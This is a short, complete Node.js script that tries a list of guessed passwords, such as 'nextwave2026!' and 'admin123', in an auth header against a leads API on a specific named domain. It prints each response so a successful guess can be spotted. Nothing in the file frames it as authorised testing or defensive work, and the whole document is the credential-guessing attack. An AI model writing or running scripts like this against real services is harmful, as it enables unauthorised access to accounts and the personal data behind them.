import https from 'https';

const passwords = [
    'nextwave2026!',
    'nextwave2025!',
    'NextWave2026!',
    'nextwave',
    'admin123',
];

async function tryPassword(pwd) {
    return new Promise((resolve) => {
        const options = {
            hostname: 'dnextwave.com',
            path: '/api/get-leads?tab=active&filter=all&_t=123',
            method: 'GET',
            headers: { 'x-nextwave-auth': pwd }
        };
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve({ status: res.statusCode, pwd, data: data.substring(0, 100) }));
        });
        req.on('error', e => resolve({ status: 'ERR', pwd, data: e.message }));
        req.end();
    });
}

(async () => {
    for (const pwd of passwords) {
        const result = await tryPassword(pwd);
        console.log(`[${result.status}] "${result.pwd}" => ${result.data}`);
    }
})();
